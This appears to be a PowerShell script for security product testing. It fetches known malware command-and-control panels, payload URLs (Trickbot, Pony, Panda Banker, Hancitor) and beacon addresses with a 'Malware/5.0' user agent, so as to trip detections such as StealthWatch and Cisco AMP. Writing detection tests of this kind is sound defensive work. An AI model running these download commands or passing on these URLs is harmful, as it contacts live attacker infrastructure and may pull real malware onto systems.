wget http://trumplines.bit/en/ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://letit2.bit -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://siteeu.bit -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget https://46.105.131.66 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget https://67.206.193.182 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://69.14.75.158 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://76.79.62.150 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://80.2.118.90 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://81.130.208.120 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://87.114.93.29 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://117.121.216.226 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://185.236.77.228 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://195.123.214.147 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://206.15.68.148 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://207.47.95.202 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#Pony / EvilPony / Panda Banker Payload URLS
wget http://wansaiful.com/wp-content/plugins/easy-media-download/1 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://wansaiful.com/wp-content/plugins/easy-media-download/2 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://wansaiful.com/wp-content/plugins/easy-media-download/3 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#Hancitor / Pony / EvilPony C2
wget http://lysedsohap.com/4/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://withtednoke.ru/4/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://dinghegear.ru/4/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://lysedsohap.com/mlu/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://withtednoke.ru/mlu/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://dinghegear.ru/mlu/forum.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://lysedsohap.com/d2/about.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://withtednoke.ru/d2/about.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://dinghegear.ru/d2/about.php -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#PANDA DOMAIN
wget http://robwassotdint.ru -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#Trickbot download
wget http://95.110.193.132/ser0410.bin -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"


###StealthWatch###
#StealthWatch Sites to trip cognitive threat analytics

wget http://www.examplemalwaredomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://www.internetbadguys.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://www.examplebotnetdomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"


###Cisco AMP###

#Bifrost Beacon
wget http://getmalware.com:7777/payload -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
